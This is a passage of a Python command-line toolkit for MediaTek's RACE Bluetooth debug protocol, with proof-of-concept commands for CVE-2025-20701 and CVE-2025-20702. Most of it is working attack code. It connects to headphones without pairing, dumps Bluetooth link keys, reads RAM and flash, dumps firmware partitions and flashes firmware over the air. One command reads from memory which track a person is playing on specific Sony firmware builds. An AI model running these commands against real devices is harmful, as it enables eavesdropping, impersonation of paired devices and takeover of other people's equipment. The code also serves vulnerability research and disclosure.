    pkt = GetLinkKeyResponse.unpack(res)
    logging.info("Got link key response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(pkt.payload)
    else:
        logging.info("Found %d link keys:", pkt.num_of_devices)
        for i, key in enumerate(pkt.link_keys):
            logging.info("%d: %s", i, key.hex())


async def command_bdaddr(r: RACE, outfile: str):
    """Retrieve Bluetooth address from the target device."""
    logging.info("Sending get Bluetooth address request")
    await r.setup()
    p = GetEDRAddress()
    res = await r.send_sync(p)
    addr_pkt = GetEDRAddressResponse.unpack(res)
    logging.info("Got Bluetooth address response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        formatted_address = ":".join(
            f"{byte:02X}" for byte in addr_pkt.bd_addr)
        logging.info(formatted_address)


async def command_enumerate_classic(args: argparse.Namespace):
    """Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC).

    This command demonstrates the impact of CVE-2025-20701 by connecting to a
    device via Bluetooth Classic without authentication and enumerating all
    exposed services via SDP (Service Discovery Protocol).
    """
    from bumble.core import BT_BR_EDR_TRANSPORT

    # Select controller if not specified
    controller = select_bluetooth_controller(args.controller)
    if not controller:
        return

    # Release Bluetooth controller
    release_bluetooth_controller(controller)

    # If no target address, scan for Classic devices
    target_address = args.target_address
    if not target_address:
        devices = await scan_classic_devices(controller, timeout=10.0)
        target_address = select_classic_device(devices, None)
        if not target_address:
            return
        # Need to release again after scanning
        release_bluetooth_controller(controller)

    logging.info("=" * 60)
    logging.info("CVE-2025-20701: Missing BR/EDR Authentication - PoC")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This vulnerability allows connecting to Bluetooth Classic devices"
    )
    logging.info(
        "WITHOUT pairing. Normally, devices should require user confirmation"
    )
    logging.info(
        "before allowing profile connections. Vulnerable devices skip this."
    )
    logging.info("")

    # Create checker to connect
    checker = RFCOMMBumbleChecker(controller, target_address, False)
    await checker.setup()

    logging.info("Connecting to %s without authentication...",
                 target_address)

    max_retries = 3
    retry_delay = 3.0
    connected = False

    for attempt in range(max_retries + 1):
        try:
            if checker.device is None:
                logging.error("Bluetooth device not initialized")
                return
            checker.connection = await checker.device.connect(  # type: ignore[misc]
                target_address, transport=BT_BR_EDR_TRANSPORT
            )
            connected = True
            break
        except Exception as e:  # pylint: disable=broad-exception-caught
            error_str = str(e).lower()

            if "limited_resources" in error_str:
                if attempt == 0:
                    logging.warning(
                        "Connection rejected by remote device - "
                        "device has too many active connections."
                    )
                else:
                    logging.warning("Retry %d/%d failed.",
                                    attempt, max_retries)

                if attempt < max_retries:
                    await checker.close()
                    reset_usb_bluetooth_controller(controller)
                    release_bluetooth_controller(controller)
                    logging.info(
                        "Waiting %.1f seconds before retry %d/%d...",
                        retry_delay, attempt + 1, max_retries
                    )
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 1.5
                    checker = RFCOMMBumbleChecker(
                        controller, target_address, False)
                    await checker.setup()
                else:
                    logging.error(
                        "All %d retries exhausted. Target device may be busy.",
                        max_retries
                    )
                    await checker.close()
                    return

            elif "page_timeout" in error_str:
                logging.error("Connection failed: %s", e)
                logging.info("")
                logging.info("PAGE TIMEOUT - The device did not respond.")
                logging.info("Possible causes:")
                logging.info("  1. Device is out of range (try moving closer)")
                logging.info("  2. Device is powered off or in sleep mode")
                logging.info("  3. Device is not in connectable mode")
                logging.info("  4. Bluetooth address may be incorrect")
                logging.info("")
                logging.info(
                    "Tip: Make sure the target device is awake and nearby.")
                await checker.close()
                return

            elif "authentication" in error_str or "rejected" in error_str:
                logging.error("Connection failed: %s", e)
                logging.info("")
                logging.info("Connection was REJECTED by the device.")
                logging.info(
                    "This may mean the device is PATCHED against CVE-2025-20701."
                )
                await checker.close()
                return

            else:
                logging.error("Connection failed: %s", e)
                logging.info("")
                logging.info("Connection could not be established.")
                await checker.close()
                return

    if not connected:
        return

    logging.info("Connected successfully WITHOUT pairing!")
    logging.info("")
    logging.info("-" * 60)
    logging.info("IMPACT: The following services are accessible without auth:")
    logging.info("-" * 60)

    # Get device name
    try:
        name = await checker.connection.request_remote_name()
        logging.info("Device Name: %s", name)
    except Exception:  # pylint: disable=broad-exception-caught
        logging.info("Device Name: (could not retrieve)")

    # Enumerate all RFCOMM services
    from bumble.rfcomm import find_rfcomm_channels
    from bumble.core import UUID as BumbleUUID
    channels = await find_rfcomm_channels(checker.connection)

    def format_uuid(uuid_obj) -> str:
        """Format a UUID object to a readable string with name if known."""
        if isinstance(uuid_obj, BumbleUUID):
            # Get the string representation and name
            uuid_str = str(uuid_obj)
            if uuid_obj.name and uuid_obj.name != uuid_str:
                return f"{uuid_obj.name} ({uuid_str})"
            return uuid_str
        return str(uuid_obj)

    def format_uuids(uuids) -> str:
        """Format a list of UUIDs to a readable string."""
        if isinstance(uuids, list):
            return ", ".join(format_uuid(u) for u in uuids)
        return format_uuid(uuids)

    if channels:
        logging.info("")
        logging.info("RFCOMM Services (Serial Port Profile):")
        for channel, service_info in channels.items():
            uuid_str = format_uuids(
                service_info) if service_info else "Unknown"
            logging.info("  Channel %2d: %s", channel, uuid_str)

            # Check if it's a known RACE UUID
            known_uuid = RFCOMMTransport._matches_any_known_uuid(service_info)
            if known_uuid:
                logging.info(
                    "             ^^^ RACE PROTOCOL EXPOSED! (CVE-2025-20702)")
    else:
        logging.info("No RFCOMM services found.")

    # Check for HFP (Hands-Free Profile)
    logging.info("")
    logging.info("Checking for common profiles...")

    try:
        from bumble.hfp import find_hf_sdp_record
        hfp_record = await find_hf_sdp_record(checker.connection)
        if hfp_record:
            channel, _, _ = hfp_record
            logging.info(
                "  HFP (Hands-Free Profile): Channel %d - ACCESSIBLE", channel)
            logging.info("    -> Attacker could intercept/inject audio calls!")
    except Exception:  # pylint: disable=broad-exception-caught
        pass

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20701")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This device allows Bluetooth Classic connections without pairing.")
    logging.info("An attacker within Bluetooth range (~10m) can:")
    logging.info("  1. Connect to the device without user consent")
    logging.info("  2. Access exposed Bluetooth profiles (HFP, A2DP, etc.)")
    logging.info(
        "  3. If RACE is exposed, fully compromise the device (CVE-2025-20702)")
    logging.info("")

    await checker.close()


async def command_enumerate_race(r: RACE):
    """Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC).

    This command demonstrates the impact of CVE-2025-20702 by connecting to
    the RACE protocol and enumerating what sensitive data can be accessed.
    """
    logging.info("=" * 60)
    logging.info("CVE-2025-20702: RACE Protocol Exposure - PoC")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "RACE (Relay And Command Engine) is MediaTek's debug/control protocol."
    )
    logging.info(
        "It provides privileged access to device internals including:"
    )
    logging.info("  - Reading/writing RAM and Flash memory")
    logging.info("  - Dumping Bluetooth link keys (device pairing secrets)")
    logging.info("  - Firmware updates (FOTA)")
    logging.info("  - Device configuration and diagnostics")
    logging.info("")
    logging.info("-" * 60)
    logging.info("Connecting to RACE protocol...")
    logging.info("-" * 60)

    try:
        await r.setup()
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.error("Failed to connect to RACE protocol: %s", e)
        return

    logging.info("RACE protocol connection established!")
    logging.info("")
    logging.info("-" * 60)
    logging.info("ENUMERATING ACCESSIBLE DATA:")
    logging.info("-" * 60)
    logging.info("")

    # Try to get SDK info
    logging.info("[1] SDK Information:")
    try:
        p = GetSDKInfo()
        res = await r.send_sync(p)
        sdk_info = res[7:].decode("utf8", errors="replace").strip("\x00")
        logging.info("    %s", sdk_info)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to get build version
    logging.info("")
    logging.info("[2] Build Version:")
    try:
        p = BuildVersion()
        res = await r.send_sync(p)
        build_ver = res[7:].decode("utf8", errors="replace").strip("\x00")
        logging.info("    %s", build_ver)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to get Bluetooth address
    logging.info("")
    logging.info("[3] Bluetooth Address:")
    try:
        p = GetEDRAddress()
        res = await r.send_sync(p)
        addr_pkt = GetEDRAddressResponse.unpack(res)
        formatted_addr = ":".join(f"{b:02X}" for b in addr_pkt.bd_addr)
        logging.info("    %s", formatted_addr)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to dump link keys (most sensitive!)
    logging.info("")
    logging.info("[4] Bluetooth Link Keys (CRITICAL):")
    try:
        p = GetLinkKey()
        res = await r.send_sync(p)
        if len(res) > 7:
            link_key_data = res[7:]
            # Check if there are any link keys
            if link_key_data and any(b != 0 for b in link_key_data):
                logging.info("    Found %d bytes of link key data",
                             len(link_key_data))
                logging.info("    -> ACCESSIBLE - CRITICAL SECURITY BREACH!")
                logging.info(
                    "    -> Attacker can impersonate paired devices!")
            else:
                logging.info("    No link keys stored (device not paired)")
                logging.info("    -> Command accessible, no data present")
        else:
            logging.info("    -> Command accessible")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to read RAM (sample - first few bytes)
    logging.info("")
    logging.info("[5] RAM Access:")
    try:
        # Try to read a small chunk from a typical RAM address
        dumper = RACERAMDumper(r, 0x04200000, 16, progress=False)
        sample_data = await dumper.dump()
        if sample_data:
            logging.info("    Successfully read 16 bytes from RAM")
            logging.info("    -> ACCESSIBLE - Full memory read possible!")
        else:
            logging.info("    -> Read returned empty data")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to read Flash (partition table area)
    logging.info("")
    logging.info("[6] Flash Memory Access:")
    try:
        flash_dumper = RACEFlashDumper(r, 0x0, 0x100)
        sample_flash = await flash_dumper.dump()
        if sample_flash:
            logging.info("    Successfully read 256 bytes from Flash")
            logging.info("    -> ACCESSIBLE - Full firmware dump possible!")
        else:
            logging.info("    -> Read returned empty data")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20702")
    logging.info("=" * 60)
    logging.info("")
    logging.info("The RACE protocol is exposed without authentication.")
    logging.info("An attacker can:")
    logging.info("  1. Read device firmware and extract secrets")
    logging.info("  2. Dump Bluetooth link keys to impersonate paired devices")
    logging.info("  3. Read/write device memory for code execution")
    logging.info("  4. Flash malicious firmware updates")
    logging.info("")
    logging.info("Combined with CVE-2025-20701 (no BR/EDR auth), an attacker")
    logging.info("can fully compromise this device from up to 10 meters away.")
    logging.info("")


async def command_raw(r: RACE, cmd_id: int, outfile: str):
    """Send a raw RACE command with the specified ID."""
    logging.info("Sending raw RACE command")
    await r.setup()
    race_header = RaceHeader(
        head=0x5, type_=RaceType.CMD_EXPECTS_RESPONSE, id_=cmd_id)
    p = RacePacket(race_header)
    res = await r.send_sync(p)

    logging.info("Got response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        hexdump(res)


async def command_sdkinfo(r: RACE, outfile: str):
    """Retrieve SDK information from the target device."""
    logging.info("Sending get SDK info request")
    await r.setup()
    p = GetSDKInfo()
    res = await r.send_sync(p)
    logging.info("Got SDK info response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        logging.info(res[7:].decode("utf8"))


async def _get_buildversion(r: RACE):
    """Retrieve build version from the target device."""
    await r.setup()
    p = BuildVersion()
    return await r.send_sync(p)


async def command_buildversion(r: RACE, outfile: str):
    """Retrieve and display build version from the target device."""
    logging.info("Sending get build version request")
    res = await _get_buildversion(r)
    logging.info("Got build version response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        logging.info(res[7:].decode("utf8"))


async def _read_media_attr(d: RACEDumper, addr: int) -> str:
    """Read a media attribute from RAM at the given address."""
    ptr_bytes = await d.dump(addr, 0x4)
    ptr = struct.unpack("<I", ptr_bytes)[0]
    data = await d.dump(ptr, 0x40)
    return data.decode("utf8")


async def command_mediainfo(r: RACE):
    """Dump current playing media info from the target device."""
    logging.info(
        "Trying to dump current playing media info. Identifying model and firmware version first..."
    )
    try:
        bv = await _get_buildversion(r)
    except asyncio.TimeoutError as e:
        logging.error("Failed to get build version: %s", e)
        return
    bv = bv[7:].replace(b"\x00", b"").decode("ascii")
    logging.info("Got buildversion `%s`.", bv)

    dumper = RACERAMDumper(r, 0, 0, progress=False)
    # We only do this for device that we know and where can get the buildversion.
    # Currently this is Sony CH-WH720n in version 1.0.8, 1.0.9, and 1.1.0
    if (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12023/01/12 19:15:56 GMT +08:00"
    ):  # v1.0.8
        t = await _read_media_attr(dumper, 0x14238C9C)
        al = await _read_media_attr(dumper, 0x14238CA4)
        ar = await _read_media_attr(dumper, 0x14238C8C)
        gen = await _read_media_attr(dumper, 0x14238CA8)
        logging.info("Your target is currently listening to:")
        logging.info("\tTrack: %s", t)
        logging.info("\tAlbum: %s", al)
        logging.info("\tArtist: %s", ar)
        logging.info("\tGenre: %s", gen)
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/09/18 18:58:55 GMT +08:00"
    ):  # v1.1.0
        t = await _read_media_attr(dumper, 0x14238C98)
        al = await _read_media_attr(dumper, 0x14238CA0)
        ar = await _read_media_attr(dumper, 0x14238C88)
        gen = await _read_media_attr(dumper, 0x14238CA4)
        logging.info("Your target is currently listening to:")
        logging.info("\tTrack: %s", t)
        logging.info("\tAlbum: %s", al)
        logging.info("\tArtist: %s", ar)
        logging.info("\tGenre: %s", gen)
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/06/28 13:44:31 GMT +08:00"
    ):  # v1.0.9
        # each field is prepended with 0x02 0xLL where LL is the length of the string
        # but to be faster we just dump 0x100 bytes and do the parsing afterwards, hoping we
        # dumped enough
        data = await dumper.dump(0x14238DB0, 0x100)
        parts = data.split(b"\x02")[1:5]
        m = ["Track", "Album", "Artist", "Genre"]
        logging.info("Your target is currently listening to:")
        for i, part in enumerate(parts):
            plen = part[0]
            logging.info("\t%s: %s", m[i], part[1: plen + 1].decode('utf8'))
            if len(part) > plen + 1 and part[plen + 1] == 0x01:
                break
    else:
        logging.error(
            "Sorry, we don't know this buildversion. We don't support unknown versions."
        )


async def command_dump_partition(r: RACE, outfile: str):
    """Interactively choose and dump a partition from the target device."""
    # dumping a whole partion to stdout is kinda stupid, so lets not do it
    if not outfile:
        logging.error(
            "Please specify an outfile to dump the NVDM partition to.")
        sys.exit(1)

    logging.info("Reading partition table:")
    pt_dumper = RACEFlashDumper(r, 0x0, 0x1000)
    pt = await pt_dumper.dump()

    partitions = parse_partition_table(pt)
    logging.info("\nPartition Table")
    logging.info("===================")
    for idx, (addr, size, ptype) in enumerate(partitions):
        logging.info(
            "Partition %2d: Address = 0x%08X, Length = 0x%08X, Type = %s",
            idx, addr, size, ptype
        )
    logging.info(
        "\n\x1b[3mHint: The NVDM partition is usually in partition 6\x1b[0m\n")

    chosen = -1
    while chosen >= len(partitions) or chosen < 0:
        chosen = int(input("Which partition would you like to dump?\n"))

    ptaddr, ptsize, _ = partitions[chosen]
    logging.info("Dumping partition %d at 0x%08X", chosen, ptaddr)

    dumper = RACEFlashDumper(r, ptaddr, ptsize)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_fota(
    r: RACE, fota_file: str, dont_reflash: bool, chunks_per_write: int
):
    """Perform FOTA (Firmware Over The Air) update on the target device."""
    f = FOTAUpdater(r, chunks_per_write)
    if fota_file is None and dont_reflash is False:
        logging.error(
            "FOTA File is required when --dont-reflash is not set!"
        )
        return
    # Invert the dont_reflash flag so that it's clearer in the FOTA updater class
    await f.update(fota_file, not dont_reflash)


async def main():
    """Main entry point for the RACE toolkit."""
    # Parse arguments and commands
    args = parse_args()

    setup_logging(args.debug)

    # Commands that don't need RACE transport
    if args.command == "check":
        await command_check(args)
        return
    if args.command == "enumerate-classic":
        await command_enumerate_classic(args)
        return

    # Initialize the transport class based on the given technology and target UUIDs
    transport = None
    try:
        transport = init_transport(args)
    except ValueError as e:
        logging.error("Transport could not be initialized: %s", e)
        return

    r = None
    try:
        r = RACE(transport, args.send_delay)
        if args.command == "ram":
            await command_ram(r, args.address, args.size, args.outfile, args.debug)
        elif args.command == "raw":
            # args.id is fine, it's not a builtin shadow
            await command_raw(r, args.id, args.outfile)
        elif args.command == "flash":
            await command_flash(
                r, args.address, args.size, args.outfile, args.debug
            )
        elif args.command == "link-keys":
            await command_link_keys(r, args.outfile)
        elif args.command == "bdaddr":
            await command_bdaddr(r, args.outfile)
        elif args.command == "sdkinfo":
            await command_sdkinfo(r, args.outfile)
        elif args.command == "buildversion":
            await command_buildversion(r, args.outfile)
        elif args.command == "mediainfo":
            await command_mediainfo(r)
        elif args.command == "enumerate-race":
            await command_enumerate_race(r)
        elif args.command == "dump-partition":
            await command_dump_partition(r, args.outfile)
        elif args.command == "fota":
            await command_fota(
                r, args.fota_file, args.dont_reflash, args.chunks_per_write
            )
    except ConnectionError as e:
        logging.error("Connection failed: %s", e)
        # Offer to try alternative transport if using GATT
        if args.transport.lower() == "gatt" and args.target_address:
            logging.info(
                "Tip: Your device may use Bluetooth Classic. "
                "Try: --transport rfcomm --target-address %s",
                args.target_address
            )
        elif args.transport.lower() == "gatt" and not args.target_address:
            await _offer_transport_fallback(args, r)
    finally:
        if r is not None:
            await r.close()


async def _offer_transport_fallback(
    args: argparse.Namespace, current_race: RACE | None
):
    """Offer to try RFCOMM transport when GATT fails."""
    logging.info(
        "\nWould you like to try Bluetooth Classic (RFCOMM) instead? [y/N]: "
    )
    response = input().strip().lower()
    if response in ("y", "yes"):
        logging.info(
            "Please enter the Bluetooth Classic address (e.g., AA:BB:CC:DD:EE:FF):")
        bt_addr = input().strip()
        if bt_addr:
            # Close the current connection if any
            if current_race is not None:
                await current_race.close()

            # Try RFCOMM
            logging.info("Attempting RFCOMM connection to %s...", bt_addr)
            release_bluetooth_controller(args.controller)
            rfcomm_transport = RFCOMMTransport(
                args.controller, bt_addr, args.authenticate
            )
            r = RACE(rfcomm_transport, args.send_delay)
            try:
                # Re-run the command with new transport
                if args.command == "mediainfo":
                    await command_mediainfo(r)
                elif args.command == "buildversion":
                    await command_buildversion(r, args.outfile)
                elif args.command == "sdkinfo":
                    await command_sdkinfo(r, args.outfile)
                elif args.command == "bdaddr":
                    await command_bdaddr(r, args.outfile)
                else:
                    logging.info(
                        "Please re-run the command with --transport rfcomm --target-address %s",
                        bt_addr
                    )
            finally:
                await r.close()


def run_main():
    """Run main with proper exception handling."""
    # Check debug flag early for exception handling display
    debug_mode = "--debug" in sys.argv

    try:
        asyncio.run(main())
    except asyncio.CancelledError:
        # Task was cancelled, usually due to connection issues
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error(
            "Operation was cancelled. The connection may have been lost."
        )
        sys.exit(1)
    except asyncio.TimeoutError as e:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        msg = str(e) if str(e) else "Operation timed out."
        logging.error("%s", msg)
        sys.exit(1)
    except ConnectionError as e:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error("Connection error: %s", e)
        sys.exit(1)
    except USBErrorBusy:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error(
            "USB device is busy. The Bluetooth controller may still be in use. "
            "Try unplugging and replugging the adapter, or run: "
            "sudo systemctl stop bluetooth"
        )
        sys.exit(1)
    except KeyboardInterrupt:
        logging.info("Interrupted by user.")
        sys.exit(130)
    except Exception as e:  # pylint: disable=broad-exception-caught
        # Catch-all for any other exceptions (including bumble exceptions)
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error("Error: %s", e)
        if not debug_mode:
            logging.info("Run with --debug for full traceback.")
        sys.exit(1)


if __name__ == "__main__":
    run_main()
